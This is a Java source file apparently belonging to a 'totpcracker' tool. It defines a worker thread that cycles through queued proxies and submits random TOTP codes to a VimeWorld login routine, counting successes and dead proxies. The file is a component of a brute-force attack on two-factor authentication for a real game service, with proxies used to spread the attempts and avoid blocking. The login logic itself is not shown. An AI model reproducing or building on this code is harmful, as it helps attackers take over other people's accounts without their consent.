package pro.delfik.totpcracker;

import lombok.Getter;

import java.net.ConnectException;
import java.net.Proxy;

@Getter
public class Worker extends Thread {

	private final VimeWorldLogin at;
	public volatile int fuckups;
	public volatile int successfulCodes;
	private volatile boolean blocked;

	public Worker(VimeWorldLogin at) {
		this.at = at;
	}

	public void block() {
		blocked = true;
	}

	@Override
	public void run() {
		while (true) {
			if (blocked) {
				if (delay(1000)) break;
				continue;
			}
			try {
				Proxy proxy = VimeWorldLogin.QUEUED_PROXIES.peek();
				if (proxy == null) {
					if (delay(100)) break;
					else continue;
				}
				at.lifecycle(proxy, at.randomTotpCode());
				successfulCodes++;
			} catch (Throwable ex) {
				while (ex.getCause() != null) ex = ex.getCause();
				if (ex instanceof ConnectException && ex.getMessage().contains("refused")) {
					System.out.println("\u001b[31mПрокси " + getName() + " мёртв: \u001b[0m" + ex.getMessage());
					return;
				}
				System.out.println("\u001b[31mfuckup from " + getName() + "\u001b[0m - " + ex.getClass().getSimpleName() + ", " + ex.getMessage());
				fuckups++;
//				if (delay(5000 + (int) (Math.random() * 10000))) break;
			}
		}
	}

	public boolean delay(long ms) {
		try {
			sleep(ms);
			return false;
		} catch (InterruptedException ex) {
			return true;
		}
	}

	public void unblock() {
		blocked = false;
	}

}
